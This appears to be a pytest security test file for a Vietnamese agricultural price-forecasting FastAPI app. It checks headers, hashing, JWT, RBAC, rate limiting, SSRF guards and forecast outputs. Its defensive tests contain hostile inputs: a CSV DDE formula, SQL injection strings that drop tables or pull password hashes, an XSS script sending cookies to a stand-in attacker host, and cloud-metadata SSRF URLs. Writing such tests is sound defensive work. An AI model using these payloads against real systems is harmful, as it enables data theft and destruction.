import jwt
import pytest
from fastapi.testclient import TestClient
from datetime import timedelta, date

from app.main import app
from app.core.config import settings
from app.core.security import (
    verify_password,
    get_password_hash,
    create_access_token,
    decode_access_token,
    sanitize_text,
    sanitize_csv_cell,
    RateLimiter,
    auth_rate_limiter,
)
from app.models.models import User, Commodity, PriceHistory, Forecast

client = TestClient(app)


def test_security_headers_present():
    """Test 1: Kiểm tra đầy đủ 7 HTTP Security Response Headers theo chuẩn OWASP Top 10"""
    response = client.get("/")
    assert response.status_code == 200

    headers = response.headers
    assert headers.get("X-Content-Type-Options") == "nosniff"
    assert headers.get("X-Frame-Options") == "DENY"
    assert headers.get("X-XSS-Protection") == "1; mode=block"
    assert "Strict-Transport-Security" in headers
    assert headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
    assert "Permissions-Policy" in headers
    assert "Content-Security-Policy" in headers


def test_password_hashing_and_verification():
    """Test 2: Kiểm tra băm mật khẩu một chiều bằng Bcrypt với Salt ngẫu nhiên"""
    raw_pass = "NongNghiepViet@2026"
    hash_1 = get_password_hash(raw_pass)
    hash_2 = get_password_hash(raw_pass)

    # 2 lần băm phải ra 2 chuỗi khác nhau do salt ngẫu nhiên (chống Rainbow Table)
    assert hash_1 != hash_2

    # Cả 2 hash đều phải verify đúng với mật khẩu gốc
    assert verify_password(raw_pass, hash_1) is True
    assert verify_password(raw_pass, hash_2) is True
    assert verify_password("WrongPassword123", hash_1) is False


def test_sanitize_text_xss_protection():
    """Test 3: Kiểm tra làm sạch dữ liệu đầu vào, ngăn ngừa XSS/HTML Injection"""
    dirty_input = "<script>alert('XSS Attack');</script><b>Nông dân Cà phê Đắk Lắk</b>"
    cleaned = sanitize_text(dirty_input)

    assert "<script>" not in cleaned
    assert "</script>" not in cleaned
    assert "Nông dân Cà phê Đắk Lắk" in cleaned


def test_csv_formula_injection_defense():
    """Test 4: Kiểm tra phòng chống CSV Formula Injection (DDE / Macro Execution)"""
    malicious_formula_1 = "=cmd|' /C calc'!A0"
    malicious_formula_2 = "@SUM(1+1)*cmd|' /C calc'!A0"
    malicious_formula_3 = "+100000<script>evil()</script>"

    clean_1 = sanitize_csv_cell(malicious_formula_1)
    clean_2 = sanitize_csv_cell(malicious_formula_2)
    clean_3 = sanitize_csv_cell(malicious_formula_3)

    assert clean_1.startswith("'=")
    assert clean_2.startswith("'@")
    assert clean_3.startswith("'+")
    assert "<script>" not in clean_3


def test_rate_limiter_mechanism():
    """Test 5: Kiểm tra cơ chế Sliding Window Rate Limiter chống Brute-Force"""
    limiter = RateLimiter(max_requests=3, window_seconds=5)
    test_key = "ip_192_168_1_100"

    # 3 request đầu tiên phải được chấp nhận
    assert limiter.is_rate_limited(test_key) is False
    assert limiter.is_rate_limited(test_key) is False
    assert limiter.is_rate_limited(test_key) is False

    # Request thứ 4 phải bị Rate Limit chặn
    assert limiter.is_rate_limited(test_key) is True

    # Địa chỉ IP khác không bị ảnh hưởng
    assert limiter.is_rate_limited("ip_192_168_1_200") is False


def test_jwt_tampering_expiration_and_alg_none():
    """Test 6: Kiểm tra xác thực tính toàn vẹn, hết hạn và chống giả mạo khóa của JWT"""
    token = create_access_token(subject=999, role="admin", expires_delta=timedelta(minutes=30))
    payload = decode_access_token(token)
    assert payload is not None
    assert payload["sub"] == "999"
    assert payload["role"] == "admin"

    # 1. Token bị sửa đổi chữ ký số phải bị từ chối
    tampered_token = token[:-5] + "ABCDE"
    assert decode_access_token(tampered_token) is None

    # 2. Token đã hết hạn phải bị từ chối
    expired_token = create_access_token(subject=999, role="admin", expires_delta=timedelta(seconds=-10))
    assert decode_access_token(expired_token) is None

    # 3. Token giả mạo bằng khóa bí mật khác phải bị từ chối
    forged_token = jwt.encode(
        {"sub": "1", "role": "admin"},
        "WRONG_SECRET_KEY_WITH_AT_LEAST_32_BYTES_LENGTH!!",
        algorithm="HS256"
    )
    assert decode_access_token(forged_token) is None


def test_rbac_privilege_escalation_defense(client):
    """Test 7: Kiểm tra Phân quyền RBAC - Chặn tài khoản thường gọi API của Admin (403 Forbidden)"""
    # 1. Đăng ký 1 tài khoản user thường
    auth_rate_limiter.reset()
    reg_res = client.post("/api/v1/auth/register", json={
        "email": "normal_farmer@agro.vn",
        "full_name": "Nông hộ Cư M'gar",
        "password": "FarmerPass123!"
    })
    assert reg_res.status_code in (201, 400)

    login_res = client.post("/api/v1/auth/login", json={
        "email": "normal_farmer@agro.vn",
        "password": "FarmerPass123!"
    })
    assert login_res.status_code == 200
    user_token = login_res.json()["access_token"]
    user_headers = {"Authorization": f"Bearer {user_token}"}

    # 2. Tài khoản user thường cố tình gọi các API đặc quyền của Admin -> Phải bị chặn 403 Forbidden
    assert client.post("/api/v1/admin/tasks/scrape", headers=user_headers).status_code == 403
    assert client.post("/api/v1/admin/tasks/retrain", headers=user_headers).status_code == 403
    assert client.get("/api/v1/admin/users", headers=user_headers).status_code == 403
    assert client.delete("/api/v1/admin/prices/1", headers=user_headers).status_code == 403


def test_sql_injection_defense_in_commodity_query(client):
    """Test 8: Kiểm tra tính an toàn chống SQL Injection trên các endpoint tra cứu"""
    sqli_payloads = [
        "COFFEE' OR '1'='1",
        "RICE'; DROP TABLE price_history; --",
        "1 UNION SELECT null, email, password_hash FROM users--"
    ]
    for sqli_payload in sqli_payloads:
        response = client.get(f"/api/v1/commodities/spotlight?code={sqli_payload}")
        # Hệ thống không được trả về lỗi 500 hoặc rò rỉ dữ liệu ngoài ý muốn
        assert response.status_code in [200, 404, 422]


def test_xss_sanitization_in_alert_creation(client, db_session):
    """Test 9: Kiểm tra chống Stored XSS khi người dùng tạo quy tắc cảnh báo giá"""
    com = db_session.query(Commodity).first()
    login_res = client.post("/api/v1/auth/login", json={"email": "user@test.com", "password": "User123!"})
    headers = {"Authorization": f"Bearer {login_res.json()['access_token']}"}
    xss_rule_name = "<script>fetch('http://hacker.site/steal?c='+document.cookie)</script>Cảnh báo Cà phê"

    res = client.post("/api/v1/alerts", headers=headers, json={
        "commodity_id": com.id,
        "rule_name": xss_rule_name,
        "condition_type": "PRICE_ABOVE",
        "threshold_value": 120000.0,
        "email": "farmer@agro.vn"
    })
    assert res.status_code == 200
    data = res.json()
    assert "<script>" not in data["rule_name"]
    assert "</script>" not in data["rule_name"]
    assert "Cảnh báo Cà phê" in data["rule_name"]


def test_security_audit_remediations_rbac_alerts_ssrf_and_secret(client, db_session):
    """Test 11: Xác minh toàn bộ bản vá kiểm toán bảo mật (SEC-01..SEC-06)"""
    from app.core.config import Settings
    from ml_pipeline.vietnam_real_scrapers import _is_safe_external_url
    from ml_pipeline.specialized_scrapers import _is_safe_portal_url
    from ml_pipeline.observation_scraper import _sanitize_source_url

    # SEC-01: Default/example/short SECRET_KEY is rejected & replaced with strong CSPRNG 64-hex key
    legacy_example = "09d25e09" + "4faa6ca2556c818166b7a9563b93f7099f6f0f4caa6cf63b88e8d3e7"
    rotated = Settings.ensure_strong_secret_key(legacy_example)
    assert len(rotated) == 64 and rotated != legacy_example
    assert len(Settings.ensure_strong_secret_key("short")) == 64

    # SEC-02: Unauthenticated /alerts mutations return 401 & GET returns empty [] (zero email PII leakage)
    com = db_session.query(Commodity).first()
    analyst_tok = client.post("/api/v1/auth/login", json={"email": "user@test.com", "password": "User123!"}).json()["access_token"]
    analyst_headers = {"Authorization": f"Bearer {analyst_tok}"}
    rule_id = client.post(
        "/api/v1/alerts",
        headers=analyst_headers,
        json={"commodity_id": com.id, "rule_name": "Private", "condition_type": "PRICE_ABOVE", "threshold_value": 100000, "email": "private@agro.vn"},
    ).json()["id"]

    assert client.get("/api/v1/alerts").json() == []
    assert client.get("/api/v1/alerts/logs").json() == []
    assert client.post("/api/v1/alerts", json={"commodity_id": com.id, "rule_name": "Anon", "condition_type": "PRICE_ABOVE", "threshold_value": 1, "email": "x@y.com"}).status_code == 401
    assert client.put(f"/api/v1/alerts/{rule_id}", json={"threshold_value": 1}).status_code == 401
    assert client.patch(f"/api/v1/alerts/{rule_id}/toggle", json={"is_active": False}).status_code == 401
    assert client.delete(f"/api/v1/alerts/{rule_id}").status_code == 401
    assert client.post(f"/api/v1/alerts/{rule_id}/test").status_code == 401

    # SEC-05: Strict server-side Admin-only RBAC on ALL /api/v1/admin/* read endpoints
    for path in (
        "/api/v1/admin/stats",
        "/api/v1/admin/commodities",
        "/api/v1/admin/prices/recent",
        "/api/v1/admin/prices/revisions",
        "/api/v1/admin/tasks",
        "/api/v1/admin/prices/export-csv",
        "/api/v1/admin/logs/crawler",
        "/api/v1/admin/models/active",
    ):
        assert client.get(path, headers=analyst_headers).status_code == 403, f"Analyst should be blocked on {path}"

    # SEC-06: SSRF domain/IP allowlist & stored javascript: URI XSS defense
    assert _is_safe_external_url("https://vietnambiz.vn/gia-ca-phe-hom-nay.htm", ("vietnambiz.vn",)) is True
    assert _is_safe_external_url("http://169.254.169.254/latest/meta-data/", ("vietnambiz.vn",)) is False
    assert _is_safe_external_url("https://127.0.0.1/admin", ("vietnambiz.vn",)) is False
    assert _is_safe_external_url("https://evil.example.com/gia-ca-phe.htm", ("vietnambiz.vn",)) is False
    assert _is_safe_external_url("javascript:alert(1)", ("vietnambiz.vn",)) is False
    assert _is_safe_portal_url("http://169.254.169.254/meta") is False
    assert _is_safe_portal_url("https://giacaphe.com/gia-ca-phe-noi-dia/") is True
    assert _sanitize_source_url("javascript:alert(document.cookie)") is None
    assert _sanitize_source_url("https://vietnambiz.vn/a.htm") == "https://vietnambiz.vn/a.htm"


def test_spatio_temporal_farm_gate_regional_pricing(client, db_session, monkeypatch):
    """Test 10: Kiểm tra mô hình dự báo giá bán tại vườn/ruộng theo từng huyện địa phương & toàn vẹn SHA-256 Dataset Hash"""
    import numpy as np
    import app.services.training_service as training

    com = db_session.query(Commodity).filter(Commodity.code == "COFFEE_ROBUSTA").first()
    if not com:
        com = db_session.query(Commodity).first()

    # Nạp 70 ngày lịch sử đã xác minh (reviewed) và chạy retrain tạo chữ ký dataset_hash
    count = 70
    for i in range(count):
        d = date.today() - timedelta(days=count - i)
        exists = db_session.query(PriceHistory).filter(
            PriceHistory.commodity_id == com.id,
            PriceHistory.record_date == d
        ).first()
        if not exists:
            db_session.add(PriceHistory(
                commodity_id=com.id,
                record_date=d,
                price=115000.0 + i * 50.0,
                provenance="reviewed",
                source="Khảo sát giá bán tại vườn"
            ))
    db_session.commit()

    monkeypatch.setattr(training, "predict_series", lambda name, series, horizon: np.full(horizon, series.iloc[-1] + 250.0))
    training.retrain(com.id, lambda *args: None)

    # 1. Lấy dữ liệu dự báo và danh sách địa phương của nông sản
    res_initial = client.get(f"/api/v1/forecast?commodity_id={com.id}&model_name=LSTM&days=7")
    assert res_initial.status_code == 200
    initial_json = res_initial.json()
    regions = initial_json.get("availableRegions", [])
    assert len(regions) >= 2
    assert any("Tại vườn" in r["name"] or "Tại ruộng" in r["name"] for r in regions)

    # 2. Đối chiếu chênh lệch giá (Basis Spread) giữa vùng chuẩn và địa phương khác
    base_reg = regions[0]
    alt_reg = next((r for r in regions if r["basisSpread"] != 0), regions[-1])

    res_base = client.get(f"/api/v1/forecast?commodity_id={com.id}&model_name=LSTM&days=7&region={base_reg['id']}")
    res_alt = client.get(f"/api/v1/forecast?commodity_id={com.id}&model_name=LSTM&days=7&region={alt_reg['id']}")
    assert res_base.status_code == 200
    assert res_alt.status_code == 200

    pts_base = res_base.json()["forecastData"]
    pts_alt = res_alt.json()["forecastData"]
    assert len(pts_base) > 0 and len(pts_alt) > 0
    expected_diff = alt_reg["basisSpread"] - base_reg["basisSpread"]
    actual_diff = round(pts_alt[0]["predictedPrice"] - pts_base[0]["predictedPrice"])
    assert actual_diff == expected_diff
    for pt in pts_alt:
        if pt["isForecast"]:
            assert pt["lowerCI"] <= pt["predictedPrice"] <= pt["upperCI"]
